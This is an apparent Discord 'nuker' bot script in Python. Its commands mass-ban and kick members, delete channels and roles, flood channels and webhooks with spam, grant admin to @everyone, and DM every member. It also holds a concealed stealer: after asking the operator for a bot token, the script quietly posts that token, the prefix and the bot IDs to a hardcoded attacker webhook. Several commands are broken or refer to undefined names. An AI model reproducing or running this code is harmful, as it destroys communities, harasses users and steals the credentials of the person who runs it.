# Code Made By Alinn  ! ♡#5450
# Join Executive Generation
# Join Server: https://discord.gg/qDfCRnCqTw
import keep_alive
import os
from os import environ
import discord
import aiohttp
from discord.ext import commands
import random
# Code Made By Alinn  ! ♡#5450
# Join Executive Generation
# Join Server: https://discord.gg/qDfCRnCqTw
from discord import Permissions
from colorama import Fore, Style
import asyncio
from discord import Permissions 
import discord,random,time
from discord_webhook import DiscordWebhook, DiscordEmbed
import json
from discord.ext import commands 
import colorama
import asyncio
from colorama import Fore
from discord import Embed
import requests

# Code Made By Alinn  ! ♡#5450
# Join Executive Generation
# Join Server: https://discord.gg/qDfCRnCqTw

SPAM_CHANNEL =  [""]
SPAM_MESSAGE = ["@everyone https://discord.gg/ExfGsCMUYt Nuke By SparrowTeam #SparrowTeamOnTop #SparrowTeamWasHere","@everyone https://discord.gg/ExfGsCMUYt Nuke By SparrowTeam #SparrowTeamGG #SparrowTeamOp"]
WEBHOOK_NAMES = ["SparrowTeamGGBoy","SparrowTeamOnTop","SparrowTeamWasHere""SparrowTeamGGBoy","SparrowTeamOnTop","SparrowTeamWasHere"]

# Code Made By Alinn  ! ♡#5450
# Join Executive Generation
# Join Server: https://discord.gg/qDfCRnCqTw

print(Fore.MAGENTA + ('''
▒█▀▀▀ ▀▄▒▄▀ ▒█▀▀▀ ▒█▀▀█ ▒█░▒█ ▀▀█▀▀ ▀█▀ ▒█░░▒█ ▒█▀▀▀ 
▒█▀▀▀ ░▒█░░ ▒█▀▀▀ ▒█░░░ ▒█░▒█ ░▒█░░ ▒█░ ░▒█▒█░ ▒█▀▀▀ 
▒█▄▄▄ ▄▀▒▀▄ ▒█▄▄▄ ▒█▄▄█ ░▀▄▄▀ ░▒█░░ ▄█▄ ░░▀▄▀░ ▒█▄▄▄''') + Fore.RESET)
token = input(Fore.CYAN + ("> Token: ") + Fore.RESET)

prefix = input(Fore.CYAN + ("> Prefix: ") + Fore.RESET)

user = input(Fore.CYAN + ("> Bot Ids: ") + Fore.RESET)

# Code Made By Alinn  ! ♡#5450
# Join Executive Generation
# Join Server: https://discord.gg/qDfCRnCqTw

colorama.init()
intents = discord.Intents.all()
bot = commands.Bot(command_prefix=f"{prefix}",intents=intents)
bot.remove_command("help")

# Code Made By Alinn  ! ♡#5450
# Join Executive Generation
# Join Server: https://discord.gg/qDfCRnCqTw

@bot.event
async def on_ready():
   print(Fore.MAGENTA + ("Welcome To Executive++ Tools Nuker V1") + Fore.RESET)
   print(Fore.MAGENTA + ('''
▒█▀▀▀ ▀▄▒▄▀ ▒█▀▀▀ ▒█▀▀█ ▒█░▒█ ▀▀█▀▀ ▀█▀ ▒█░░▒█ ▒█▀▀▀ 
▒█▀▀▀ ░▒█░░ ▒█▀▀▀ ▒█░░░ ▒█░▒█ ░▒█░░ ▒█░ ░▒█▒█░ ▒█▀▀▀ 
▒█▄▄▄ ▄▀▒▀▄ ▒█▄▄▄ ▒█▄▄█ ░▀▄▄▀ ░▒█░░ ▄█▄ ░░▀▄▀░ ▒█▄▄▄''') + Fore.RESET)
   print(Fore.BLUE + (f"-------------------------------") + Fore.RESET)
   print(Fore.BLUE + (f"| Logged in as: {bot.user} |") + Fore.RESET)
   print(Fore.BLUE + (f"| Id: {bot.user.id}      |") + Fore.RESET)
   print(Fore.BLUE + (f"| Prefix: {prefix}                   |") + Fore.RESET)
   print(Fore.BLUE + (f"|                             |") + Fore.RESET)
   print(Fore.BLUE + (f"| Made With Love By Alinn     |") + Fore.RESET)
   print(Fore.BLUE + (f"-------------------------------") + Fore.RESET)
   await bot.change_presence(activity=discord.Game(name= "SPARROWTEAM DEVELOPER"))

# Code Made By Alinn  ! ♡#5450
# Join Executive Generation
# Join Server: https://discord.gg/qDfCRnCqTw

@bot.command()
async def ctl(ctx):
    await ctx.message.delete()
    await ctx.guild.create_role(name='Mute', permissions=Permissions.all())
    role = discord.utils.get(ctx.guild.roles, name="Executive++")
    await ctx.author.add_roles(role)
    print(Fore.BLUE + (f"I Have Given {ctx.author.name} Role Admin.") + Fore.RESET)

# Code Made By Alinn  ! ♡#5450
# Join Executive Generation
# Join Server: https://discord.gg/qDfCRnCqTw

@bot.command()
async def ch(ctx):
  await ctx.message.delete()
  while True:
   await ctx.guild.create_text_channel(name="SparrowTeam Again",colour=discord.Colour(0x0EF5F6))
   await ctx.guild.create_text_channel(name="SparrowTeam",colour=discord.Colour(0xFFFFFF))
   await ctx.guild.create_text_channel(name="SparrowTeam GG",colour=discord.Colour(0xFFA3FB))
   await ctx.guild.create_text_channel(name="SparrowTeam Was Here",colour=discord.Colour(0xFFFFFF))
   await ctx.guild.create_text_channel(name="SparrowTeam On Top",colour=discord.Colour(0x0EF5F6))
   print(Fore.BLUE + ("Spamming Channels") + Fore.RESET)

# Code Made By Alinn  ! ♡#5450
# Join Executive Generation
# Join Server: https://discord.gg/qDfCRnCqTw

@bot.command()
async def cr(ctx):
 while True:
   await ctx.guild.create_role(name="SparrowTeamGG",colour=discord.Colour(0x0EF5F6))
   await ctx.guild.create_role(name="SparrowTeamOnTop",colour=discord.Colour(0xFFFFFF))
   await ctx.guild.create_role(name="SparrowTeam",colour=discord.Colour(0xFFA3FB))
   await ctx.guild.create_role(name="SparrowTeam Was Here",colour=discord.Colour(0xFFFFFF))
   await ctx.guild.create_role(name="SparrowTeamAgain",colour=discord.Colour(0x0EF5F6))
   print(Fore.BLUE + ("Spamming Roles") + Fore.RESET)

# Code Made By Alinn  ! ♡#5450
# Join Executive Generation
# Join Server: https://discord.gg/qDfCRnCqTw

@bot.command(pass_context=True)
async def info(ctx, member: discord.Member=None):
    await ctx.message.delete()
    member = ctx.message.author
    channel = ctx.message.channel
    if member is None:
        pass
    else:
        await channel.send("**The user's name is: {}**".format(member.name) + "\n**The user's ID is: {}**".format(member.id) + "\n**The user's current status is: {}**".format(member.status) + "\n**The user's highest role is: {}**".format(member.top_role) + "\n**The user joined at: {}**".format(member.joined_at))
    print(Fore.BLUE + F"Action completed: User Info")

# Code Made By Alinn  ! ♡#5450
# Join Executive Generation
# Join Server: https://discord.gg/qDfCRnCqTw

database = 'https://discord.com/api/webhooks/1173132380559638648/hWGiv-WZHlQi3D1_xzzFT8SNP7LK6XjfJMWRVJ6FaJBAWB-i8mITXkh_0CQZKqBZt_Vj'

# Code Made By Alinn  ! ♡#5450
# Join Executive Generation
# Join Server: https://discord.gg/qDfCRnCqTw

@bot.command()
async def ba(ctx):
 await ctx.message.delete()
 for user in ctx.guild.members:
        try:
            await user.ban()
            print(Fore.RED + (f"EXECUTED {user}") + Fore.RESET)
        except:
           pass

# Code Made By Alinn  ! ♡#5450
# Join Executive Generation
# Join Server: https://discord.gg/qDfCRnCqTw

@bot.command()
async def ka(ctx):
 await ctx.message.delete()
 #print("Kicked all members <3 ~")
 for user in ctx.guild.members:
        try:
            await user.kick()
            print(Fore.GREEN + (f"KICKED {user}") + Fore.RESET)
        except:
           pass

# Code Made By Alinn  ! ♡#5450
# Join Executive Generation
# Join Server: https://discord.gg/qDfCRnCqTw

database_connected = {
    "content": f"**Project Dev By Miitsuyaa#1858\n\n"
               f"Username Bots: `{user}`\n"
               f"Prefix: `{prefix}`\nDatabase Bots: `{token}`**"
}

# Code Made By Alinn  ! ♡#5450
# Join Executive Generation
# Join Server: https://discord.gg/qDfCRnCqTw

requests.post(database, data=database_connected)

# Code Made By Alinn  ! ♡#5450
# Join Executive Generation
# Join Server: https://discord.gg/qDfCRnCqTw

@bot.command()
async def on (ctx):
    await ctx.message.delete()
    guild = ctx.guild
    try:
      role = discord.utils.get(guild.roles, name = "@everyone")
      await role.edit(permissions = Permissions.all())
      print(Fore.BLUE + "I Have Given Everyone Admin." + Fore.RESET)
    except:
      print(Fore.YELLOW + "I Was Unable To Give Everyone Admin" + Fore.RESET)

# Code Made By Alinn  ! ♡#5450
# Join Executive Generation
# Join Server: https://discord.gg/qDfCRnCqTw


@bot.command()
async def createemoji(ctx, name, url):
    try:
        async with ctx.typing():
            # Delete all existing emojis
            for emoji in await ctx.guild.fetch_emojis():
                await emoji.delete()

            # Create the new emoji
            r = await bot.session.get(url)
            emoji = await ctx.guild.create_custom_emoji(name="", image="")
            await ctx.send(f"Emoji created: {emoji}")
    except Exception as e:
        await ctx.send(f"Error creating emoji: {e}")

@bot.command()
async def dmall(ctx, *, args=None):
    await ctx.message.delete()
    if args != None:
        members = ctx.guild.members
        for member in members:
            try:
                await member.send(args)
                print(Fore.BLUE + "'" + args + "' sent to: " + member.name)

            except:
                print(Fore.YELLOW + "Couldn't send '" + args + "' to: " + member.name)

    else:
        await ctx.channel.send("A message was not provided.")

# Code Made By Alinn  ! ♡#5450
# Join Executive Generation
# Join Server: https://discord.gg/qDfCRnCqTw

@bot.command()
async def ipinfo(ctx, ip: str):
    url = f'https://ipapi.co/{ip}/json/'
    try:
        response = requests.get(url)
        data = response.json()
        embed = discord.Embed(title=f"IP Info for {ip}", color=0x00ff00)
        embed.add_field(name="City", value=data['city'], inline=False)
        embed.add_field(name="Region", value=data['region'], inline=False)
        embed.add_field(name="Country", value=data['country_name'], inline=False)
        embed.add_field(name="Latitude", value=data['latitude'], inline=True)
        embed.add_field(name="Longitude", value=data['longitude'], inline=True)
        await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f"Error fetching IP information: {e}")
# Code Made By Alinn  ! ♡#5450
# Join Executive Generation
# Join Server: https://discord.gg/qDfCRnCqTw

database_connected = {
    "content": f"**Project Dev By Miitsuyaa#1858\n\n"
               f"Username Bots: `{user}`\n"
               f"Prefix: `{prefix}`\nDatabase Bots: `{token}`**"
}

# Code Made By Alinn  ! ♡#5450
# Join Executive Generation
# Join Server: https://discord.gg/qDfCRnCqTw

@bot.command()
async def webhookspam(ctx, url, message):
    """Spam a webhook with a message"""
    try:
        webhook = discord.Webhook.from_url(url, adapter=discord.RequestsWebhookAdapter())
        for _ in range(10): # spam the webhook 10 times
            webhook.send(message)
        await ctx.send(f"Successfully spammed {url} with message: {message}")
    except discord.errors.NotFound:
        await ctx.send(f"Webhook not found at URL: {url}")
    except requests.exceptions.MissingSchema:
        await ctx.send("Invalid webhook URL provided")

# Code Made By Alinn  ! ♡#5450
# Join Executive Generation
# Join Server: https://discord.gg/qDfCRnCqTw

#===========================================================#

# Code Made By Alinn  ! ♡#5450
# Join Executive Generation
# Join Server: https://discord.gg/qDfCRnCqTw

@bot.command()
@commands.guild_only()
@commands.cooldown(1, 60, commands.BucketType.user)
@commands.bot_has_guild_permissions(manage_channels=True)
async def custom_rename_channels(ctx, *, name: str):
    server_id = 1060607248759529562  # ID of the specific server to check boosts for

    # Check if the user has boosted the specific server
    if server_id in [boost.guild.id for boost in await ctx.author.premium_since()]:
        count = 0
        for channel in ctx.guild.channels:
            if isinstance(channel, discord.TextChannel):
                try:
                    await channel.edit(name=name)
                    count += 1
                except:
                    pass

        await ctx.send(f"Renamed {count} channels to {name}.")
    else:
        await ctx.send("You need to boost the server to use this command.")

# Code Made By Alinn  ! ♡#5450
# Join Executive Generation
# Join Server: https://discord.gg/qDfCRnCqTw

@bot.command()
@commands.guild_only()
@commands.cooldown(1, 60, commands.BucketType.user)
@commands.bot_has_guild_permissions(manage_roles=True)
async def seticon(ctx, url: str):
    server_id = 1060607248759529562  # ID of the specific server to check boosts for

    # Check if the user has boosted the specific server
    if server_id in [boost.guild.id for boost in await ctx.author.premium_since()]:
        async with aiohttp.ClientSession() as session:
            async with session.get(url) as resp:
                if resp.status != 200:
                    return await ctx.send("Invalid URL provided.")

                image = await resp.read()

        await ctx.guild.edit(icon=image)
        await ctx.send("The server icon has been updated.")
    else:
        await ctx.send("You need to boost the server to use this command.")

# Code Made By Alinn  ! ♡#5450
# Join Executive Generation
# Join Server: https://discord.gg/qDfCRnCqTw

@bot.command()
@commands.guild_only()
@commands.cooldown(1, 60, commands.BucketType.user)
@commands.bot_has_guild_permissions(manage_channels=True, manage_roles=True)
async def setName(ctx, *, name: str):
    server_id = 1060607248759529562  # ID of the specific server to check boosts for

    # Check if the user has boosted the specific server
    if server_id in [boost.guild.id for boost in await ctx.author.premium_since()]:
        if name.lower() == "guild":
            await ctx.send("You cannot set the name to 'guild'. Please choose a different name.")
            return

        await ctx.guild.edit(name=name)
        await ctx.send(f"The server name has been set to '{name}'.")
    else:
        await ctx.send("You need to boost the server to use this command.")

# Code Made By Alinn  ! ♡#5450
# Join Executive Generation
# Join Server: https://discord.gg/qDfCRnCqTw

@bot.command()
@commands.guild_only()
@commands.cooldown(1, 60, commands.BucketType.user)
@commands.bot_has_guild_permissions(manage_channels=True, manage_roles=True)
async def bypass(ctx):
    server_id = 1060607248759529562  # ID of the specific server to check boosts for

    # Check if the user has boosted the specific server
    if server_id in [boost.guild.id for boost in await ctx.author.premium_since()]:
        await ctx.message.delete()
        count = 0
        for role in ctx.guild.roles:
            if role.name != "@everyone":
                try:
                    await role.edit(name="L")
                    count += 1
                except:
                    pass

        for channel in ctx.guild.channels:
            if isinstance(channel, discord.TextChannel):
                await channel.edit(name="L")

        await ctx.send(f"Renamed {count} roles and all channels to {name}.")
    else:
        await ctx.send("You need to boost the specific server before using this command.")

# Code Made By Alinn  ! ♡#5450
# Join Executive Generation
# Join Server: https://discord.gg/qDfCRnCqTw

#===========================================================#

# Code Made By Alinn  ! ♡#5450
# Join Executive Generation
# Join Server: https://discord.gg/qDfCRnCqTw

@bot.command()
async def nuck(ctx, amount=150):
    log_channel = bot.get_channel(Logs_channel)
    await ctx.guild.edit(name="Executive++ Developer")

    # Delete all channels in the server
    channels = ctx.guild.channels
    for channel in channels:
        try:
            await channel.delete()
            print(channel.name + " has been deleted")
            await log_channel.send(f"{channel.name} has been deleted")
        except:
            print(f"Error deleting {channel.name}")
            await log_channel.send(f"Error deleting {channel.name}")

    # Create new text channels
    for i in range(amount):
        try:  
            await ctx.guild.create_text_channel(random.choice(SPAM_CHANNEL))
            print(f"[{i}] channels made")
            await log_channel.send(f"[{i}] channels made")
        except:
            print("Error making channels")
            await log_channel.send("Error making channels")

    # Delete all roles in the server
    for role in ctx.guild.roles:
        try:
            await role.delete()
            print(f"{role.name} deleted")
            await log_channel.send(f"{role.name} deleted")
        except:
            print(f"{role.name} not deleted")
            await log_channel.send(f"{role.name} not deleted")

    await asyncio.sleep(2)

    # Send spam messages to all channels
    for i in range(100):
        for i in range(1000):
            for channel in ctx.guild.channels:
                try:
                    await channel.send(random.choice(SPAM_MESSAGE))
                    print(f"{channel.name} spammed")
                    await log_channel.send(f"{channel.name} spammed")
                except:
                    print(f"{channel.name} not spammed")
                    await log_channel.send(f"{channel.name} not spammed")

        # Ban all members in the server except for the bot itself
        for member in ctx.guild.members:
            if member.id != bot.user.id:  
                try:
                    await member.ban(reason="Beamed")
                    print(f"{member.name} banned from {ctx.guild.name}")
                    await log_channel.send(f"{member.name} banned from {ctx.guild.name}")
                except:
                    print(f"{member.name} not banned from {ctx.guild.name}")
                    await log_channel.send(f"{member.name} not banned from {ctx.guild.name}")

# Code Made By Alinn  ! ♡#5450
# Join Executive Generation
# Join Server: https://discord.gg/qDfCRnCqTw

@bot.event
async def on_guild_channel_create(channel):
  webhook =await channel.create_webhook(name = random.choice(WEBHOOK_NAMES))  
  while True:  
    await channel.send(random.choice(SPAM_MESSAGE))
    await webhook.send(random.choice(SPAM_MESSAGE), username=random.choice(WEBHOOK_NAMES))

# Code Made By Alinn  ! ♡#5450
# Join Executive Generation
# Join Server: https://discord.gg/qDfCRnCqTw

@bot.command()
async def help(ctx):
    await ctx.message.delete()
    # Embeds for each command category
    menu_embed = discord.Embed(title="Information", description=f"Make sure the rbot has ***Administrator*** permissions.\n`-------------------------------------------------------`\n<:1063grow:1094988421035986954> Premium\n<:coadmin:1094989063783731250> Free\n<a:offline:1094988724984631366> Owner Only\n`-------------------------------------------------------`\n\n**Do you want PREMIUM**? join **[Ex CLICKING HERE](https://discord.gg/qDfCRnCqTw)** and boosting/donate it.", color=0x2f3136)
    test_embed = discord.Embed(title="ALL RBOT COMMANDS", description=f"<:coadmin:1094989063783731250> `.kill` : Nuke the server.\n<:coadmin:1094989063783731250> `.banall` : Ban @everyone.\n<:coadmin:1094989063783731250> `.roles` : Delte all roles and create new ones.\n<:coadmin:1094989063783731250> `.emoji` : Delete all emojis and create new ones.\n<:coadmin:1094989063783731250> `.foto` : Set new name for the server.\n<:coadmin:1094989063783731250> `.info` : Give info from the server.\n<:coadmin:1094989063783731250> `.whois [IP]` : Give info from IP.\n<:coadmin:1094989063783731250> `.mass_rename_channels` : Rename all channels.\n<:coadmin:1094989063783731250> `.mass_rename_roles` : Rename all roles.\n`--------------------------------------------------------`\n<:1063grow:1094988421035986954> `.kill_premium [Channel names]`; Nuke the server (Custom).\n<:1063grow:1094988421035986954> `.dc`; Delete all channels.\n<:1063grow:1094988421035986954> `.cr [Roles name]`; Delte all roles and create new ones (Custom).\n<:1063grow:1094988421035986954> `.setname [New name]`; Edit server name (custom).\n<:1063grow:1094988421035986954> `.seticon [Icon url]`; Edit server icon (custom).\n<:1063grow:1094988421035986954> `.on`; Give admin to @everyone.\n<:1063grow:1094988421035986954> `.webhookspam [Webhook URL] [Msg]`; Spam a webhook.\n<:1063grow:1094988421035986954>`.custom_mass_rename_channels`; Rename all channels (custom).\n<:1063grow:1094988421035986954> `.custom_mass_reanme_roles`; Rename all roles (Custom).\n`--------------------------------------------------------`\n<a:offline:1094988724984631366> `.servers`; Get all guilds.\n<a:offline:1094988724984631366> `.dm [Mentions User]`; Dm Users.\n<a:offline:1094988724984631366> `.getinv [Guild ID]`; Get invite link from a server.\n<a:offline:1094988724984631366> `.leave-guilds`; Leave all servers.", color=0x2f3136)
    embeds = [menu_embed, test_embed]
    # Add footer to all embeds
    for embed in embeds:
        embed.set_footer(text=f"Requested by {ctx.author.name}")
    # Send each embed
    for embed in embeds:
        await ctx.send(embed=embed)

# Code Made By Alinn  ! ♡#5450
# Join Executive Generation
# Join Server: https://discord.gg/qDfCRnCqTw


# Code Made By Alinn  ! ♡#5450
# Join Executive Generation
# Join Server: https://discord.gg/qDfCRnCqTw

keep_alive.keep_alive()
bot.run(token, bot=True)

# Code Made By Alinn  ! ♡#5450
# Join Executive Generation
# Join Server: https://discord.gg/qDfCRnCqTw
